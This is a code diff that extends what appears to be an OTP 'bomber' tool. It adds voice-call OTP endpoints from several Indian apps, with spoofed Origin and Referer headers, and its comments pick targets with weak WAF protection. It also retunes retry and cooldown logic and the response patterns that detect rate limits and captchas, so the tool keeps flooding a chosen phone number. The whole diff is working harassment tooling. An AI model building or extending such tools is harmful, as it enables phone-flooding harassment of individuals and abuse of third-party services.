@@ -868,6 +868,7 @@ APIS = [
             "Origin": "https://www.swiggy.com",
             "Referer": "https://www.swiggy.com/",
         },
+        # 202 Accepted = OTP queued (handled in _body_ok)
     },
     {
         "name": "PhysicsWallah-Call",
@@ -908,6 +909,92 @@ APIS = [
         },
         "ok_hint": "otp",
     },
+
+    # ══════════════════════════════════════════════════════════════════════════
+    # 📞  CALL — Additional voice OTP APIs (backup pool)
+    # ══════════════════════════════════════════════════════════════════════════
+
+    {
+        # Doubtnut voice call OTP — same endpoint, is_voice_call flag set to True
+        "name": "Doubtnut-Call",
+        "kind": "call",
+        "url":  "https://api.doubtnut.com/v4/student/login",
+        "method": "POST",
+        "json": {"mobile": "{phone}", "is_voice_call": True},
+        "register_json": {"mobile": "{phone}", "is_voice_call": True,
+                          "new_user": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.doubtnut.com",
+            "Referer": "https://www.doubtnut.com/",
+            "X-Doubtnut-Platform": "web",
+        },
+        "ok_hint": "otp",
+    },
+    {
+        # Meesho voice OTP — reseller platform, minimal WAF
+        "name": "Meesho-Call",
+        "kind": "call",
+        "url":  "https://api.meesho.com/v1/user/login",
+        "method": "POST",
+        "json": {"phone": "{phone}", "country_code": "91", "medium": "voice"},
+        "register_json": {"phone": "{phone}", "country_code": "91",
+                          "medium": "voice", "is_new_user": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://meesho.com",
+            "Referer": "https://meesho.com/",
+        },
+        "ok_hint": "otp",
+    },
+    {
+        # ShareChat voice OTP — social platform
+        "name": "ShareChat-Call",
+        "kind": "call",
+        "url":  "https://share.chat/api/user/login",
+        "method": "POST",
+        "json": {"mobile": "+91{phone}", "type": "voice"},
+        "register_json": {"mobile": "+91{phone}", "type": "voice",
+                          "is_new": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://sharechat.com",
+            "Referer": "https://sharechat.com/",
+        },
+        "ok_hint": "otp",
+    },
+    {
+        # Unacademy voice OTP — ed-tech, low WAF
+        "name": "Unacademy-Call",
+        "kind": "call",
+        "url":  "https://unacademy.com/api/v2/user/login-or-register/",
+        "method": "POST",
+        "json": {"email_or_phone": "{phone}", "via": "call"},
+        "register_json": {"email_or_phone": "{phone}", "via": "call",
+                          "is_signup": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://unacademy.com",
+            "Referer": "https://unacademy.com/",
+        },
+        "ok_hint": "otp",
+    },
+    {
+        # Toppr voice call OTP
+        "name": "Toppr-Call",
+        "kind": "call",
+        "url":  "https://api.toppr.com/auth/api/v2/send-otp/",
+        "method": "POST",
+        "json": {"mobile": "{phone}", "country_code": "91", "medium": "voice"},
+        "register_json": {"mobile": "{phone}", "country_code": "91",
+                          "medium": "voice", "signup": True},
+        "base_headers": {
+            "Content-Type": "application/json",
+            "Origin": "https://www.toppr.com",
+            "Referer": "https://www.toppr.com/",
+        },
+        "ok_hint": "otp",
+    },
 ]
 
 API_COUNT      = len(APIS)
@@ -918,8 +1005,8 @@ CALL_COUNT     = sum(1 for a in APIS if a["kind"] == "call")
 
 # ─── Circuit breaker ──────────────────────────────────────────────────────────
 
-CIRCUIT_THRESHOLD = 3
-COOLDOWN_SEC      = 20.0
+CIRCUIT_THRESHOLD = 5   # needs 5 consecutive fails before cooling (was 3)
+COOLDOWN_SEC      = 15.0  # cool for 15s (was 20s)
 
 _api_fail_count:     dict[str, int]   = {}
 _api_cooldown_until: dict[str, float] = {}
@@ -948,7 +1035,9 @@ _FAIL_PATTERNS = (
     '"success":false', '"success": false',
     '"status":"error"', '"status": "error"',
     '"status":"fail"', '"status":"failed"',
+    '"status":"failure"', '"status":"FAILURE"',
     '"error":true', '"iserror":true',
+    '"error_code":', '"errorCode":',
     "invalid mobile", "invalid number", "invalid phone number",
     "captcha required", "captcha_required", "recaptcha",
     "too many request", "rate limit", "rate_limit", "throttle",
@@ -956,46 +1045,63 @@ _FAIL_PATTERNS = (
     '"code":400', '"code":429', '"code":401', '"code":403',
     '"statusCode":400', '"statusCode":429', '"statusCode":401', '"statusCode":403',
     '"httpstatus":400', '"httpstatus":401', '"httpstatus":403', '"httpstatus":429',
+    '"http_status_code":400', '"http_status_code":401',
+    '"http_status_code":403', '"http_status_code":429',
     "otp not sent", "could not send", "failed to send",
     '"result":"fail"', '"result":"failure"',
     "phone number not valid", "mobile not valid",
     "not a valid mobile", "number is invalid",
+    "blocked", "suspended", "deactivated",
+    "user not found", "account not found",
+    "service unavailable", "maintenance",
+    "unexpected error", "internal server error",
+    "phone not registered", "mobile not registered",
 )
 
 _OK_PATTERNS = (
+    # Explicit success flags
     '"success":true', '"success": true',
     '"status":"success"', '"status": "success"',
     '"status":"ok"', '"status": "ok"',
     '"result":"success"', '"result": "success"',
+
+    # OTP-sent specific flags
     '"smsSent":true', '"smsSent": true',
     '"sms_sent":true', '"otp_sent":true',
     '"otpSent":true', '"otpSent": true',
     '"whatsappSent":true', '"callSent":true',
-    "otp sent", "otp has been sent", "successfully sent",
+
+    # Explicit OTP-sent phrases in body
+    "otp sent", "otp has been sent",
     "otp generated", "otp send successfully", "otp sent successfully",
-    "message sent", "sms sent",
-    '"message":"otp', '"message": "otp',
-    '"message":"success"', '"message": "success"',
-    '"message":"sent"', '"msg":"otp', '"msg":"success"',
-    '"nonce":', '"tid":', '"token":', '"requestId":',
+    "otp successfully sent",
+    "sms sent successfully", "sms send successfully",
+
+    # OTP reference/ID patterns — confirm OTP was dispatched
+    '"nonce":', '"otpId":', '"otp_id":',
+    '"otp_reference":', '"txnId":',
+    '"requestId":', '"request_id":',
+
+    # Session/token patterns — only when the API design means these = OTP sent
     '"session_id":', '"sessionId":',
-    '"txnId":', '"transaction_id":',
-    '"otp_reference":', '"reference_id":',
-    '"otpId":', '"otp_id":', '"otp":',
+    '"tid":',
+
+    # Explicit OK response codes (statuscode wrapper pattern)
     '"statuscode":0', '"statusCode":0', '"code":0',
-    '"statusCode":200', '"statusCode": 200',
     '"status":1', '"status": 1',
-    '"status":200', '"status": 200',
-    '"httpCode":200', '"httpCode": 200',
+
+    # Response-code success strings
     '"response_code":"success"', '"response_code": "success"',
     '"response_code":"SUCCESS"',
     '"response":"otp', '"response": "otp',
-    '"is_new_user":', '"user_exists":',
-    '"mobile_verified":', '"phone_verified":',
-    '"contactExist":', '"emailExists":',
-    '"user_id":', '"userId":',
-    '"data":{',
-    "request processed",
+
+    # OTP value present in body = dispatched
+    '"otp":', '"otp_value":',
+
+    # Message body says success/sent
+    '"message":"otp', '"message": "otp',
+    '"message":"success"', '"message": "success"',
+    '"message":"sent"', '"msg":"otp', '"msg":"success"',
 )
 
 
@@ -1036,14 +1142,9 @@ def _body_ok(body: str, status: int, ok_hint: str = "") -> bool:
         if pat.lower() in low:
             return True
 
-    # Final heuristic: JSON 200/201 with OTP-related keywords
-    if status in (200, 201) and len(stripped) > 10:
-        if (stripped.startswith("{") or stripped.startswith("[")) and any(
-            h in low for h in ["otp", "sent", "verify", "phone", "mobile",
-                               "token", "session", "success", "sms", "message",
-                               "nonce", "user", "login"]
-        ):
-            return True
+    # NOTE: Final heuristic removed — it was catching error responses
+    # that contain words like 'user', 'login', 'mobile' in error messages.
+    # Every API must now match either an ok_hint or an _OK_PATTERNS entry.
 
     return False
 
@@ -1079,8 +1180,10 @@ async def _fire_single(
     payload, name: str,
     form_encoded: bool = False,
     ok_hint: str = "",
+    extra_timeout: int = 0,
 ):
-    timeout = aiohttp.ClientTimeout(total=15, connect=7)
+    total_t = 20 + extra_timeout  # extra time for call APIs (was 15)
+    timeout = aiohttp.ClientTimeout(total=total_t, connect=8)
     kw_base: dict = dict(headers=headers, timeout=timeout, allow_redirects=True, ssl=False)
     if isinstance(payload, dict):
         if form_encoded:
